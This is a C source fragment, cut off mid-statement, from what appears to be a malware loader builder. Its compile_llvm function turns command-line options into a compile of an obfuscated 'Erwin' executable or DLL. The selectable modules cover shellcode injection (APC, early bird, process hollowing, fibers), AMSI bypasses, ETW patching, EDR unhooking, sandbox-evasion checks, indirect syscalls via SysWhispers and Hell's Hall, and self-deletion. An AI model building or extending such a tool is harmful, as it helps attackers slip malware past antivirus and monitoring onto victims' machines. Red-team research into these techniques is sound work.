void compile_llvm(const char* extra_arg) {
	char exePath[MAX_PATH];
	char compileCommand[8192] = { 0 };
	char sourceFiles[4096] = { 0 };
	char compilerFlags[1024] = "-Xclang -flegacy-pass-manager -mllvm -sub -mllvm -sub_loop=2 -mllvm -split -mllvm -fla -mllvm -bcf -mllvm -bcf_prob=100 -mllvm -bcf_loop=2 -mllvm -split_num=2 --target=x86_64-pc-windows-msvc /GS- /W0 -Wno-int-conversion -Wno-incompatible-function-pointer-types -mstackrealign";
	char outputFile[64] = "output\\erwin\\Erwin.exe";

	// /D _UNICODE /D UNICODE

	//exec
	BOOL normal_apc = FALSE;
	BOOL normal_Early_Bird_Suspended = FALSE;
	BOOL normal_Early_Bird_Debug = FALSE;
	BOOL normal_EnumThreadWindows = FALSE;
	BOOL normal_Local_Mapping_Inject = FALSE;
	BOOL normal_Early_Cascade = FALSE;
	BOOL normal_fibers = FALSE;
	BOOL normal_hypnosis = FALSE;
	BOOL normal_tpalloc = FALSE;
	BOOL normal_local_holllowing = FALSE;

	//amsi
	BOOL amsiFlag_opensession = FALSE;
	BOOL amsiFlag_scanbuffer = FALSE;
	BOOL amsiFlag_signature = FALSE;
	BOOL amsiFlag_codetrust = FALSE;
	//unhooking
	BOOL unhookingFlag_diskcreatefile = FALSE;
	BOOL unhookingFlag_knowndlls = FALSE;
	BOOL unhookingFlag_debug = FALSE;
	BOOL unhookingFlag_hookchain = FALSE;
	//etw
	BOOL etwFlag_eventwrite = FALSE;
	BOOL etwFlag_TraceEvent = FALSE;
	BOOL etwFlag_peventwritefull = FALSE;
	//sandbox
	BOOL sandboxFlag_apihammering = FALSE;
	BOOL sandboxFlag_mouseclicks = FALSE;
	BOOL sandboxFlag_resolution = FALSE;
	BOOL sandboxFlag_processes = FALSE;
	BOOL sandboxFlag_hardware = FALSE;
	BOOL sandboxFlag_mwfmoex = FALSE;
	BOOL sandboxFlag_ntdelay = FALSE;
	BOOL sandboxFlag_fibonacci = FALSE;
	//payload-control
	BOOL payloadFlag_control = FALSE;
	BOOL payloadFlag_selfdelete = FALSE;

	//indirect syscalls syswhispers
	BOOL indirectFlag_init_syswhispers = FALSE;
	//exec
	BOOL indirectFlag_syswhispers_apc = FALSE;
	BOOL indirectFlag_syswhispers_earlybird_debug = FALSE;
	BOOL indirectFlag_syswhispers_earlybird_suspended = FALSE;
	BOOL indirectFlag_syswhispers_enumthreadwindows = FALSE;
	BOOL indirectFlag_syswhispers_localmapping = FALSE;
	BOOL indirectFlag_syswhispers_earlycascade = FALSE;
	BOOL indirectFlag_syswhispers_fibers = FALSE;
	BOOL indirectFlag_syswhispers_hypnosis = FALSE;
	BOOL indirectFlag_syswhispers_tpalloc = FALSE;
	BOOL indirectFlag_syswhispers_local_hollowing = FALSE;
	//amsi
	BOOL indirectFlag_syswhispers_opensession = FALSE;
	BOOL indirectFlag_syswhispers_scanbuffer = FALSE;
	BOOL indirectFlag_syswhispers_signature = FALSE;
	BOOL indirectFlag_syswhispers_codetrust = FALSE;
	//unhooking
	BOOL indirectFlag_syswhispers_diskcreatefile = FALSE;
	BOOL indirectFlag_syswhispers_knowndlls = FALSE;
	BOOL indirectFlag_syswhispers_debug = FALSE;
	BOOL indirectFlag_syswhispers_hookchain = FALSE;
	//etw
	BOOL indirectFlag_syswhispers_eventwrite = FALSE;
	BOOL indirectFlag_syswhispers_TraceEvent = FALSE;
	BOOL indirectFlag_syswhispers_peventwritefull = FALSE;


	//indirect syscalls hellshalls 
	//exec
	BOOL indirectFlag_init = FALSE;
	BOOL indirectFlag_hellshall_apc = FALSE;
	BOOL indirectFlag_hellshall_earlybird_debug = FALSE;
	BOOL indirectFlag_hellshall_earlybird_suspended = FALSE;
	BOOL indirectFlag_hellshall_enumthreadwindows = FALSE;
	BOOL indirectFlag_hellshall_localmapping = FALSE;
	BOOL indirectFlag_hellshall_earlycascade = FALSE;
	BOOL indirectFlag_hellshall_fibers = FALSE;
	BOOL indirectFlag_hellshall_hypnosis = FALSE;
	BOOL indirectFlag_hellshall_tpalloc = FALSE;
	BOOL indirectFlag_hellshall_local_hollowing = FALSE;

	//amsi
	BOOL indirectFlag_amsi_opensession = FALSE;
	BOOL indirectFlag_amsi_scanbuffer = FALSE;
	BOOL indirectFlag_amsi_signature = FALSE;
	BOOL indirectFlag_amsi_codetrust = FALSE;
	//unhooking
	BOOL indirectFlag_unhooking_diskcreatefile = FALSE;
	BOOL indirectFlag_unhooking_knowndlls = FALSE;
	BOOL indirectFlag_unhooking_debug = FALSE;
	BOOL indirectFlag_unhooking_hookchain = FALSE;
	//etw
	BOOL indirectFlag_etw_eventwrite = FALSE;
	BOOL indirectFlag_etw_TraceEvent = FALSE;
	BOOL indirectFlag_etw_peventwritefull = FALSE;
	//sandbox

	//misc
	BOOL miscFlag_nowindow = FALSE;
	BOOL miscFlag_printf = FALSE;
	BOOL miscFlag_dll = FALSE;
	BOOL miscFlag_service = FALSE;
	BOOL miscFlag_decoy = FALSE;
	BOOL miscFlag_inflate = FALSE;


	// Get executable path
	DWORD pathLength = GetModuleFileNameA(NULL, exePath, MAX_PATH);
	if (pathLength == 0 || pathLength >= MAX_PATH) {
		printf("Failed to get executable path.\n");
		return;
	}

	// Extract directory path by removing the executable name
	char* lastBackslash = strrchr(exePath, '\\');
	if (lastBackslash) {
		*lastBackslash = '\0'; // Truncate at the last backslash
	}

	//exec
	if (strstr(extra_arg, "normal-apc") != NULL) {
		normal_apc = TRUE;
	}

	if (strstr(extra_arg, "normal-earlybird-suspended") != NULL) {
		normal_Early_Bird_Suspended = TRUE;
	}

	if (strstr(extra_arg, "normal-earlybird-debug") != NULL) {
		normal_Early_Bird_Debug = TRUE;
	}

	if (strstr(extra_arg, "normal-enumthreadwindows") != NULL) {
		normal_EnumThreadWindows = TRUE;
	}

	if (strstr(extra_arg, "normal-localmapping") != NULL) {
		normal_Local_Mapping_Inject = TRUE;
	}

	if (strstr(extra_arg, "normal-earlycascade") != NULL) {
		normal_Early_Cascade = TRUE;
	}

	if (strstr(extra_arg, "normal-fibers") != NULL) {
		normal_fibers = TRUE;
	}

	if (strstr(extra_arg, "normal-hypnosis") != NULL) {
		normal_hypnosis = TRUE;
	}

	if (strstr(extra_arg, "normal-tpalloc") != NULL) {
		normal_tpalloc = TRUE;
	}

	if (strstr(extra_arg, "normal-local-hollowing") != NULL) {
		normal_local_holllowing = TRUE;
	}

	if (strstr(extra_arg, "hellshall-local-hollowing") != NULL) {
		indirectFlag_hellshall_local_hollowing = TRUE;
	}

	//amsi
	if (strstr(extra_arg, "amsi-opensession") != NULL) {
		amsiFlag_opensession = TRUE;
	}

	if (strstr(extra_arg, "amsi-scanbuffer") != NULL) {
		amsiFlag_scanbuffer = TRUE;
	}

	if (strstr(extra_arg, "amsi-signature") != NULL) {
		amsiFlag_signature = TRUE;
	}

	if (strstr(extra_arg, "amsi-codetrust") != NULL) {
		amsiFlag_codetrust = TRUE;
	}

	//unhooking
	if (strstr(extra_arg, "unhooking-createfile") != NULL) {
		unhookingFlag_diskcreatefile = TRUE;
	}

	if (strstr(extra_arg, "unhooking-knowndlls") != NULL) {
		unhookingFlag_knowndlls = TRUE;
	}

	if (strstr(extra_arg, "unhooking-debug") != NULL) {
		unhookingFlag_debug = TRUE;
	}

	if (strstr(extra_arg, "hookchain") != NULL) {
		unhookingFlag_hookchain = TRUE;
	}

	//etw
	if (strstr(extra_arg, "etw-eventwrite") != NULL) {
		etwFlag_eventwrite = TRUE;
	}

	if (strstr(extra_arg, "etw-trace-event") != NULL) {
		etwFlag_TraceEvent = TRUE;
	}

	if (strstr(extra_arg, "etw-peventwritefull") != NULL) {
		etwFlag_peventwritefull = TRUE;
	}

	//sandbox
	if (strstr(extra_arg, "api-hammering") != NULL) {
		sandboxFlag_apihammering = TRUE;
	}

	if (strstr(extra_arg, "mouse-clicks") != NULL) {
		sandboxFlag_mouseclicks = TRUE;
	}

	if (strstr(extra_arg, "resolution") != NULL) {
		sandboxFlag_resolution = TRUE;
	}

	if (strstr(extra_arg, "processes") != NULL) {
		sandboxFlag_processes = TRUE;
	}

	if (strstr(extra_arg, "hardware") != NULL) {
		sandboxFlag_hardware = TRUE;
	}

	if (strstr(extra_arg, "delay-mwfmoex") != NULL) {
		sandboxFlag_mwfmoex = TRUE;
	}

	if (strstr(extra_arg, "ntdelay") != NULL) {
		sandboxFlag_ntdelay = TRUE;
	}

	if (strstr(extra_arg, "fibonacci") != NULL) {
		sandboxFlag_fibonacci = TRUE;
	}

	//payload-control
	if (strstr(extra_arg, "check-running") != NULL) {
		payloadFlag_control = TRUE;
	}

	if (strstr(extra_arg, "self-delete") != NULL) {
		payloadFlag_selfdelete = TRUE;
	}


	//indirect syscalls syswhipers3

		//exec
	if (strstr(extra_arg, "init-syswhispers") != NULL) {
		indirectFlag_init_syswhispers = TRUE;
	}

	if (strstr(extra_arg, "syswhispers-apc") != NULL) {
		indirectFlag_syswhispers_apc = TRUE;
	}

	if (strstr(extra_arg, "syswhispers-earlybird-debug") != NULL) {
		indirectFlag_syswhispers_earlybird_debug = TRUE;
	}

	if (strstr(extra_arg, "syswhispers-earlybird-suspended") != NULL) {
		indirectFlag_syswhispers_earlybird_suspended = TRUE;
	}

	if (strstr(extra_arg, "syswhispers-enumthreadwindows") != NULL) {
		indirectFlag_syswhispers_enumthreadwindows = TRUE;
	}

	if (strstr(extra_arg, "syswhispers-localmapping") != NULL) {
		indirectFlag_syswhispers_localmapping = TRUE;
	}

	if (strstr(extra_arg, "syswhispers-earlycascade") != NULL) {
		indirectFlag_syswhispers_earlycascade = TRUE;
	}

	if (strstr(extra_arg, "syswhispers-fibers") != NULL) {
		indirectFlag_syswhispers_fibers = TRUE;
	}

	if (strstr(extra_arg, "syswhispers-hypnosis") != NULL) {
		indirectFlag_syswhispers_hypnosis = TRUE;
	}

	if (strstr(extra_arg, "syswhispers-tpalloc") != NULL) {
		indirectFlag_syswhispers_tpalloc = TRUE;
	}

	if (strstr(extra_arg, "syswhispers-local-hollowing") != NULL) {
		indirectFlag_syswhispers_local_hollowing = TRUE;
	}


	//amsi

	if (strstr(extra_arg, "syswhispers-amsi-opensession") != NULL) {
		indirectFlag_syswhispers_opensession = TRUE;
	}

	if (strstr(extra_arg, "syswhispers-amsi-scanbuffer") != NULL) {
		indirectFlag_syswhispers_scanbuffer = TRUE;
	}

	if (strstr(extra_arg, "syswhispers-amsi-signature") != NULL) {
		indirectFlag_syswhispers_signature = TRUE;
	}

	if (strstr(extra_arg, "syswhispers-amsi-codetrust") != NULL) {
		indirectFlag_syswhispers_codetrust = TRUE;
	}

	//unhooking

	if (strstr(extra_arg, "syswhispers-unhooking-createfile") != NULL) {
		indirectFlag_syswhispers_diskcreatefile = TRUE;
	}

	if (strstr(extra_arg, "syswhispers-unhooking-known-dlls") != NULL) {
		indirectFlag_syswhispers_knowndlls = TRUE;
	}

	if (strstr(extra_arg, "syswhispers-unhooking-debug") != NULL) {
		indirectFlag_syswhispers_debug = TRUE;
	}

	if (strstr(extra_arg, "syswhispers-unhooking-hookchain") != NULL) {
		indirectFlag_syswhispers_hookchain = TRUE;
	}

	//etw

	if (strstr(extra_arg, "syswhispers-etw-eventwrite") != NULL) {
		indirectFlag_syswhispers_eventwrite = TRUE;
	}

	if (strstr(extra_arg, "syswhispers-etw-traceevent") != NULL) {
		indirectFlag_syswhispers_TraceEvent = TRUE;
	}

	if (strstr(extra_arg, "syswhispers-etw-peventwritefull") != NULL) {
		indirectFlag_syswhispers_peventwritefull = TRUE;
	}


	//indirect syscalls hells hall
	if (strstr(extra_arg, "init-syscalls") != NULL) {
		indirectFlag_init = TRUE;
	}

	if (strstr(extra_arg, "hellshall-apc") != NULL) {
		indirectFlag_hellshall_apc = TRUE;
	}

	if (strstr(extra_arg, "hellshall-earlybird-debug") != NULL) {
		indirectFlag_hellshall_earlybird_debug = TRUE;
	}

	if (strstr(extra_arg, "hellshall-earlybird-suspended") != NULL) {
		indirectFlag_hellshall_earlybird_suspended = TRUE;
	}

	if (strstr(extra_arg, "hellshall-enumthreadwindows") != NULL) {
		indirectFlag_hellshall_enumthreadwindows = TRUE;
	}

	if (strstr(extra_arg, "hellshall-localmapping") != NULL) {
		indirectFlag_hellshall_localmapping = TRUE;
	}

	if (strstr(extra_arg, "hellshall-earlycascade") != NULL) {
		indirectFlag_hellshall_earlycascade = TRUE;
	}

	if (strstr(extra_arg, "hellshall-fibers") != NULL) {
		indirectFlag_hellshall_fibers = TRUE;
	}

	if (strstr(extra_arg, "hellshall-hypnosis") != NULL) {
		indirectFlag_hellshall_hypnosis = TRUE;
	}

	if (strstr(extra_arg, "hellshall-tpalloc") != NULL) {
		indirectFlag_hellshall_tpalloc = TRUE;
	}

	//amsi
	if (strstr(extra_arg, "hellshall-amsi-opensession") != NULL) {
		indirectFlag_amsi_opensession = TRUE;
	}

	if (strstr(extra_arg, "hellshall-amsi-scanbuf") != NULL) {
		indirectFlag_amsi_scanbuffer = TRUE;
	}

	if (strstr(extra_arg, "hellshall-amsi-signature") != NULL) {
		indirectFlag_amsi_signature = TRUE;
	}

	if (strstr(extra_arg, "hellshall-amsi-codetrust") != NULL) {
		indirectFlag_amsi_codetrust = TRUE;
	}

	//unhooking
	if (strstr(extra_arg, "hellshall-unhooking-createfile") != NULL) {
		indirectFlag_unhooking_diskcreatefile = TRUE;
	}

	if (strstr(extra_arg, "hellshall-unhooking-knowndlls") != NULL) {
		indirectFlag_unhooking_knowndlls = TRUE;
	}

	if (strstr(extra_arg, "hellshall-unhooking-debug") != NULL) {
		indirectFlag_unhooking_debug = TRUE;
	}

	if (strstr(extra_arg, "hellshall-unhooking-hookchain") != NULL) {
		indirectFlag_unhooking_hookchain = TRUE;
	}

	//etw
	if (strstr(extra_arg, "hellshall-etw-eventwrite") != NULL) {
		indirectFlag_etw_eventwrite = TRUE;
	}

	if (strstr(extra_arg, "hellshall-etw-traceevent") != NULL) {
		indirectFlag_etw_TraceEvent = TRUE;
	}

	if (strstr(extra_arg, "hellshall-etw-peventwritefull") != NULL) {
		indirectFlag_etw_peventwritefull = TRUE;
	}

	//misc
	if (strstr(extra_arg, "no-window") != NULL) {
		miscFlag_nowindow = TRUE;
	}

	if (strstr(extra_arg, "service") != NULL) {
		miscFlag_service = TRUE;
	}

	if (strstr(extra_arg, "no-print") != NULL) {
		miscFlag_printf = TRUE;
	}

	if (strstr(extra_arg, "make-dll") != NULL) {
		miscFlag_dll = TRUE;
		strcpy(outputFile, "output\\erwin\\Erwin.dll");
	}

	if (strstr(extra_arg, "inflate") != NULL) {
		miscFlag_inflate = TRUE;
	}

	if (strstr(extra_arg, "decoy") != NULL) {
		miscFlag_decoy = TRUE;
	}

	// Start building the source files list with common files
	strcat(sourceFiles, "output\\code\\enc.c output\\code\\enc.h output\\code\\exec.c output\\code\\api_hashing.cpp ");
	strcat(sourceFiles, "output\\code\\api_hashing.h output\\code\\iat_camuflage.c output\\code\\iat_camuflage.h output\\code\\typedef.h output\\code\\typedef.c output\\code\\exec.h ");
	strcat(sourceFiles, "output\\code\\start.c ");

	//exec
	if (normal_apc) {
		strcat(sourceFiles, "output\\code\\apc.c ");
		printf("[+] Including EXEC (APC) functionality in compilation...\n");
	}

	if (normal_Early_Bird_Suspended) {
		strcat(sourceFiles, "output\\code\\early_bird_suspended.c ");
		printf("[+] Including EXEC (Early Bird Suspended) functionality in compilation...\n");
	}

	if (normal_Early_Bird_Debug) {
		strcat(sourceFiles, "output\\code\\early_bird_debug.c ");
		printf("[+] Including EXEC (Early Bird Debug) functionality in compilation...\n");
	}

	if (normal_EnumThreadWindows) {
		strcat(sourceFiles, "output\\code\\callback_enumthreadwindows.c ");
		printf("[+] Including EXEC (EnumThreadWindows) functionality in compilation...\n");
	}

	if (normal_Local_Mapping_Inject) {
		strcat(sourceFiles, "output\\code\\local_mapping.c ");
		printf("[+] Including EXEC (Local Mapping Inject) functionality in compilation...\n");
	}

	if (normal_Early_Cascade) {
		strcat(sourceFiles, "output\\code\\earlycascade.c output\\code\\stub.obj ");
		printf("[+] Including EXEC (Early Cascade) functionality in compilation...\n");
	}

	if (normal_fibers) {
		strcat(sourceFiles, "output\\code\\fibers.c ");
		printf("[+] Including EXEC (Fibers) functionality in compilation...\n");
	}

	if (normal_hypnosis) {
		strcat(sourceFiles, "output\\code\\process_hypnosis.c ");
		printf("[+] Including EXEC (Process Hypnosis) functionality in compilation...\n");
	}

	if (normal_tpalloc) {
		strcat(sourceFiles, "output\\code\\tpallocinject.c ");
		printf("[+] Including EXEC (Tp Alloc) functionality in compilation...\n");
	}

	//Local Hollowing
	if (normal_local_holllowing) {
		strcat(sourceFiles, "output\\code\\local_hollowing.c ");
		printf("[+] Including EXEC (Local Hollowing) functionality in compilation...\n");
	}


	// Add optional files based on flags

	//amsi
	if (amsiFlag_opensession) {
		strcat(sourceFiles, "output\\code\\amsiopensession.c output\\code\\amsi_functions.h /D _UNICODE /D UNICODE ");
		//strcat(compilerFlags, " -DAMSI_OPENSESSION /D _UNICODE /D UNICODE");
		printf("[+] Including AMSI bypass (AmsiOpenSession) in compilation...\n");
	}

	if (amsiFlag_scanbuffer) {
		strcat(sourceFiles, "output\\code\\amsiscanbuffer.c output\\code\\amsi_functions.h /D _UNICODE /D UNICODE ");
		//strcat(compilerFlags, " -DAMSI_SCANBUFFER /D _UNICODE /D UNICODE");
		printf("[+] Including AMSI bypass (AmsiScanBuffer) in compilation...\n");
	}

	if (amsiFlag_signature) {
		strcat(sourceFiles, "output\\code\\amsisignature.c output\\code\\amsi_functions.h /D _UNICODE /D UNICODE ");
		//strcat(compilerFlags, " -DAMSI_SIGNATURE /D _UNICODE /D UNICODE");
		printf("[+] Including AMSI bypass (AmsiSignature) in compilation...\n");
	}

	if (amsiFlag_codetrust) {
		strcat(sourceFiles, "output\\code\\codetrust.c output\\code\\amsi_functions.h /D _UNICODE /D UNICODE ");
		//strcat(compilerFlags, " -DAMSI_CODETRUST /D _UNICODE /D UNICODE");
		printf("[+] Including AMSI bypass (CodeTrust) in compilation...\n");
	}

	//unhooking
	if (unhookingFlag_diskcreatefile) {
		strcat(sourceFiles, "output\\code\\unhooking_disk_createfile.c output\\code\\unhooking_functions.h ");
		//strcat(compilerFlags, " -DUNHOOKING_DISKCREATEFILE");
		printf("[+] Including Unhooking (CreateFile) functionality in compilation...\n");
	}

	if (unhookingFlag_knowndlls) {
		strcat(sourceFiles, "output\\code\\unhooking_known_dlls.c output\\code\\unhooking_functions.h ");
		//strcat(compilerFlags, " -DUNHOOKING_KNOWNDLLS");
		printf("[+] Including Unhooking (KnownDlls) functionality in compilation...\n");
	}

	if (unhookingFlag_debug) {
		strcat(sourceFiles, "output\\code\\unhooking_process_debug.c output\\code\\unhooking_functions.h ");
		//strcat(compilerFlags, " -DUNHOOKING_DEBUG");
		printf("[+] Including Unhooking (Debug Process) functionality in compilation...\n");
	}

	if (unhookingFlag_hookchain) {
		strcat(sourceFiles, "output\\code\\windows_common.h output\\code\\hook.h output\\code\\hook.c output\\code\\hookchain.obj output\\code\\unhooking_functions.h ");
		//strcat(compilerFlags, " -DUNHOOKING_HOOKCHAIN");
		printf("[+] Including Unhooking (Hookchain) functionality in compilation...\n");
	}

	//etw
	if (etwFlag_eventwrite) {
		strcat(sourceFiles, "output\\code\\etw.h output\\code\\etweventwrite.c ");
		//strcat(compilerFlags, " -DETW_EVENTWRITE");
		printf("[+] Including ETW (EVENTWRITE) bypass functionality in compilation...\n");
	}

	if (etwFlag_TraceEvent) {
		strcat(sourceFiles, "output\\code\\etw.h output\\code\\ntTraceEvent.c ");
		//strcat(compilerFlags, " -DETW_TRACEEVENT");
		printf("[+] Including ETW (Trace Event) bypass functionality in compilation...\n");
	}

	if (etwFlag_peventwritefull) {
		strcat(sourceFiles, "output\\code\\etw.h output\\code\\etwpeventwritefull.c ");
		//strcat(compilerFlags, " -DETW_PEVENTWIRTEFULL");
		printf("[+] Including ETW (pEventWriteFull) bypass functionality in compilation...\n");
	}

	//sandbox
	if (sandboxFlag_apihammering) {
		strcat(sourceFiles, "output\\code\\sandbox.h output\\code\\apihammering.c ");
		//strcat(compilerFlags, " -DSANDBOX_APIHAMMERING");
		printf("[+] Including SANDBOX (API Hammering) bypass functionality in compilation...\n");
	}

	if (sandboxFlag_mouseclicks) {
		strcat(sourceFiles, "output\\code\\sandbox.h output\\code\\mouse_clicks.c ");
		//strcat(compilerFlags, " -DSANDBOX_MOUSECLICKS");
		printf("[+] Including SANDBOX (Mouse Clicks) bypass functionality in compilation...\n");
	}

	if (sandboxFlag_resolution) {
		strcat(sourceFiles, "output\\code\\sandbox.h output\\code\\monitor.c ");
		//strcat(compilerFlags, " -DSANDBOX_RESOLUTION");
		printf("[+] Including SANDBOX (Monitor Resolution) bypass functionality in compilation...\n");
	}

	if (sandboxFlag_processes) {
		strcat(sourceFiles, "output\\code\\sandbox.h output\\code\\processes.c ");
		//strcat(compilerFlags, " -DSANDBOX_PROCESSES");
		printf("[+] Including SANDBOX (Number of Processes) bypass functionality in compilation...\n");
	}

	if (sandboxFlag_hardware) {
		strcat(sourceFiles, "output\\code\\sandbox.h output\\code\\hardware.c advapi32.lib ");
		//strcat(compilerFlags, " -DSANDBOX_HARDWARE");
		printf("[+] Including SANDBOX (Hardware) bypass functionality in compilation...\n");
	}

	if (sandboxFlag_mwfmoex) {
		strcat(sourceFiles, "output\\code\\sandbox.h output\\code\\msgwaitformultipleobjectsex.c ");
		//strcat(compilerFlags, " -DSANDBOX_MWFMOEX");
		printf("[+] Including SANDBOX (Delay MsgWaitForMultipleObjectsEx) bypass functionality in compilation...\n");
	}

	if (sandboxFlag_ntdelay) {
		strcat(sourceFiles, "output\\code\\sandbox.h output\\code\\ntdelayexecution.c ");
		//strcat(compilerFlags, " -DSANDBOX_NTDELAY");
		printf("[+] Including SANDBOX (Delay NtDelayExecution) bypass functionality in compilation...\n");
	}

	if (sandboxFlag_fibonacci) {
		strcat(sourceFiles, "output\\code\\sandbox.h output\\code\\Fibonacci.c ");
		//strcat(compilerFlags, " -DSANDBOX_FIBONACCI");
		printf("[+] Including SANDBOX (Delay Caculating Fibonacci) bypass functionality in compilation...\n");
	}

	//payload-control
	if (payloadFlag_control) {
		strcat(sourceFiles, "output\\code\\payloadcontrol.h output\\code\\semaphore.c ");
		//strcat(compilerFlags, " -DCONTROL_RUNNING");
		printf("[+] Including PAYLOAD-CONTROL (Running executable) bypass functionality in compilation...\n");
	}

	if (payloadFlag_selfdelete) {
		strcat(sourceFiles, "output\\code\\payloadcontrol.h output\\code\\self-del.c ");
		//strcat(compilerFlags, " -DCONTROL_SELFDELETE");
		printf("[+] Including PAYLOAD-CONTROL (Self deletion) bypass functionality in compilation...\n");
	}


	//indirect syscalls syswhispers

		//exec
	if (indirectFlag_init_syswhispers) {
		strcat(sourceFiles, "output\\code\\syscalls.obj output\\code\\syscalls.h output\\code\\syscalls_llvm_c.obj ");
		//strcat(compilerFlags, " -DSYSWHISPERS_INIT");
		printf("[+] Including INDIRECT SYSCALLS (Initialize Syswhispers3) functionality in compilation...\n");
	}

	if (indirectFlag_syswhispers_apc) {
		printf("[+] Including INDIRECT SYSCALLS (SysWhispers APC) functionality in compilation...\n");
	}

	if (indirectFlag_syswhispers_earlybird_debug) {
		printf("[+] Including INDIRECT SYSCALLS (SysWhispers Early Bird Debug) functionality in compilation...\n");
	}

	if (indirectFlag_syswhispers_earlybird_suspended) {
		printf("[+] Including INDIRECT SYSCALLS (SysWhispers Early Bird Suspended) functionality in compilation...\n");
	}

	if (indirectFlag_syswhispers_enumthreadwindows) {
		printf("[+] Including INDIRECT SYSCALLS (SysWhispers EnumThreadWindows) functionality in compilation...\n");
	}

	if (indirectFlag_syswhispers_localmapping) {
		printf("[+] Including INDIRECT SYSCALLS (SysWhispers Local Mapping) functionality in compilation...\n");
	}

	if (indirectFlag_syswhispers_earlycascade) {
		printf("[+] Including INDIRECT SYSCALLS (SysWhispers Early Cascade) functionality in compilation...\n");
	}

	if (indirectFlag_syswhispers_fibers) {
		printf("[+] Including INDIRECT SYSCALLS (SysWhispers Fibers) functionality in compilation...\n");
	}

	if (indirectFlag_syswhispers_hypnosis) {
		printf("[+] Including INDIRECT SYSCALLS (SysWhispers Process Hypnosis) functionality in compilation...\n");
	}

	if (indirectFlag_syswhispers_tpalloc) {
		printf("[+] Including INDIRECT SYSCALLS (SysWhispers Tp Alloc) functionality in compilation...\n");
	}

	if (indirectFlag_syswhispers_local_hollowing) {
		printf("[+] Including INDIRECT SYSCALLS (SysWhispers Local Hollowing) functionality in compilation...\n");
	}

	//amsi

	if (indirectFlag_syswhispers_opensession) {
		printf("[+] Including INDIRECT SYSCALLS (SysWhispers AMSI OpenSession) functionality in compilation...\n");
	}

	if (indirectFlag_syswhispers_scanbuffer) {
		printf("[+] Including INDIRECT SYSCALLS (SysWhispers AMSI ScanBuffer) functionality in compilation...\n");
	}

	if (indirectFlag_syswhispers_signature) {
		printf("[+] Including INDIRECT SYSCALLS (SysWhispers AMSI Signature) functionality in compilation...\n");
	}

	if (indirectFlag_syswhispers_codetrust) {
		printf("[+] Including INDIRECT SYSCALLS (SysWhispers AMSI CodeTrust) functionality in compilation...\n");
	}

	//unhooking

	if (indirectFlag_syswhispers_diskcreatefile) {
		printf("[+] Including INDIRECT SYSCALLS (SysWhispers Unhooking DiskCreateFile) functionality in compilation...\n");
	}

	if (indirectFlag_syswhispers_knowndlls) {
		printf("[+] Including INDIRECT SYSCALLS (SysWhispers Unhooking KnownDlls) functionality in compilation...\n");
	}

	if (indirectFlag_syswhispers_debug) {
		printf("[+] Including INDIRECT SYSCALLS (SysWhispers Unhooking Debug Process) functionality in compilation...\n");
	}

	if (indirectFlag_syswhispers_hookchain) {
		printf("[+] Including INDIRECT SYSCALLS (SysWhispers Unhooking Hookchain) functionality in compilation...\n");
	}
	//etw

	if (indirectFlag_syswhispers_eventwrite) {
		printf("[+] Including INDIRECT SYSCALLS (SysWhispers ETW EventWrite) functionality in compilation...\n");
	}

	if (indirectFlag_syswhispers_TraceEvent) {
		printf("[+] Including INDIRECT SYSCALLS (SysWhispers ETW TraceEvent) functionality in compilation...\n");
	}

	if (indirectFlag_syswhispers_peventwritefull) {
		printf("[+] Including INDIRECT SYSCALLS (SysWhispers ETW pEventWriteFull) functionality in compilation...\n");
	}


	//indirect syscalls hells hall
	if (indirectFlag_init) {
		strcat(sourceFiles, "output\\code\\init.c output\\code\\HellsHall.h output\\code\\init.h output\\code\\HellsHall.c output\\code\\HellsHall.h output\\code\\Structs.h output\\code\\HellsAsm.obj ");
		//strcat(compilerFlags, " -DHELLSHALL_INIT");
		printf("[+] Including INDIRECT SYSCALLS (Initialize Indirect Syscalls) functionality in compilation...\n");
	}

	if (indirectFlag_hellshall_apc) {
		printf("[+] Including INDIRECT SYSCALLS (Hells Hall APC) functionality in compilation...\n");
	}

	if (indirectFlag_hellshall_earlybird_debug) {
		printf("[+] Including INDIRECT SYSCALLS (Hells Hall Early Bird Debug) functionality in compilation...\n");
	}

	if (indirectFlag_hellshall_earlybird_suspended) {
		printf("[+] Including INDIRECT SYSCALLS (Hells Hall Early Bird Suspended) functionality in compilation...\n");
	}

	if (indirectFlag_hellshall_enumthreadwindows) {
		printf("[+] Including INDIRECT SYSCALLS (Hells Hall EnumThreadWindows) functionality in compilation...\n");
	}

	if (indirectFlag_hellshall_localmapping) {
		printf("[+] Including INDIRECT SYSCALLS (Hells Hall Local Mapping) functionality in compilation...\n");
	}

	if (indirectFlag_hellshall_earlycascade) {
		printf("[+] Including INDIRECT SYSCALLS (Hells Hall Early Cascade) functionality in compilation...\n");
	}

	if (indirectFlag_hellshall_fibers) {
		printf("[+] Including INDIRECT SYSCALLS (Hells Hall Fibers) functionality in compilation...\n");
	}

	if (indirectFlag_hellshall_hypnosis) {
		printf("[+] Including INDIRECT SYSCALLS (Hells Hall Process Hypnosis) functionality in compilation...\n");
	}

	if (indirectFlag_hellshall_tpalloc) {
		printf("[+] Including INDIRECT SYSCALLS (Hells Hall Tp Alloc) functionality in compilation...\n");
	}

	if (indirectFlag_hellshall_local_hollowing) {
		printf("[+] Including INDIRECT SYSCALLS (Hells Hall Local Hollowing) functionality in compilation...\n");
	}

	//amsi
	if (indirectFlag_amsi_opensession) {
		printf("[+] Including INDIRECT SYSCALLS (Hells Hall AMSI OpenSession) functionality in compilation...\n");
	}

	if (indirectFlag_amsi_scanbuffer) {
		printf("[+] Including INDIRECT SYSCALLS (Hells Hall AMSI ScanBuffer) functionality in compilation...\n");
	}

	if (indirectFlag_amsi_signature) {
		printf("[+] Including INDIRECT SYSCALLS (Hells Hall AMSI Signature) functionality in compilation...\n");
	}

	if (indirectFlag_amsi_codetrust) {
		printf("[+] Including INDIRECT SYSCALLS (Hells Hall AMSI CodeTrust) functionality in compilation...\n");
	}
	//unhooking
	if (indirectFlag_unhooking_diskcreatefile) {
		printf("[+] Including INDIRECT SYSCALLS (Hells Hall Unhooking DiskCreateFile) functionality in compilation...\n");
	}

	if (indirectFlag_unhooking_knowndlls) {
		printf("[+] Including INDIRECT SYSCALLS (Hells Hall Unhooking KnownDlls) functionality in compilation...\n");
	}

	if (indirectFlag_unhooking_debug) {
		printf("[+] Including INDIRECT SYSCALLS (Hells Hall Unhooking Debug Process) functionality in compilation...\n");
	}

	if (indirectFlag_unhooking_hookchain) {
		printf("[+] Including INDIRECT SYSCALLS (Hells Hall Hookchain) functionality in compilation...\n");
	}
	//etw

	if (indirectFlag_etw_eventwrite) {
		printf("[+] Including INDIRECT SYSCALLS (Hells Hall ETW EventWrite) functionality in compilation...\n");
	}

	if (indirectFlag_etw_TraceEvent) {
